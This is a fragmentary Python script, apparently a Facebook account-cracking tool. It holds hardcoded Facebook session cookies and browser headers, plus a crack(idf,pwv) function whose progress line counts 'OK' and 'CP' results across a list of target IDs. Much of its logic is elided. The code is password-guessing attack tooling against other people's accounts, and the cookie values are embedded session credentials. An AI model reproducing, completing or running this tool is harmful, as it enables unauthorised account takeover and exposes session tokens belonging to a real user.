...
import requests
cookies = {
    'datr': 'IaNuZBe384HooMbE6p6tSLUK',
    'sb': 'IaNuZCKXQL0NQR-2PPULK0zV',
    'm_pixel_ratio': '2.549999952316284',
    'locale': 'fr_FR',
    'wl_cbv': 'v2%3Bclient_version%3A2257%3Btimestamp%3A1684972539',
    'vpd': 'v1%3B608x424x2.549999952316284',
    'wd': '424x1051',
    'fr': '0JntTnUhN1J3Zrhe7.AWV5xBFFIs7bB26kCi8Px_-IW5M.BkbqMh.I8.AAA.0.0.BkbqW0.AWU4sdhkpzk',
}
...
headers = {
    ...
    "accept-language": 'en-CA,en;q=0.9,ar-MA;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5,en-GB;q=0.4,en-US;q=0.3',
    "cache-control": 'max-age=0',
    # "cookie": 'datr=IaNuZBe384HooMbE6p6tSLUK; sb=IaNuZCKXQL0NQR-2PPULK0zV; m_pixel_ratio=2.549999952316284; locale=fr_FR; wl_cbv=v2%3Bclient_version%3A2257%3Btimestamp%3A1684972539; vpd=v1%3B608x424x2.549999952316284; wd=424x1051; fr=0JntTnUhN1J3Zrhe7.AWV5xBFFIs7bB26kCi8Px_-IW5M.BkbqMh.I8.AAA.0.0.BkbqW0.AWU4sdhkpzk',
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r (ZAKI🔥) {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
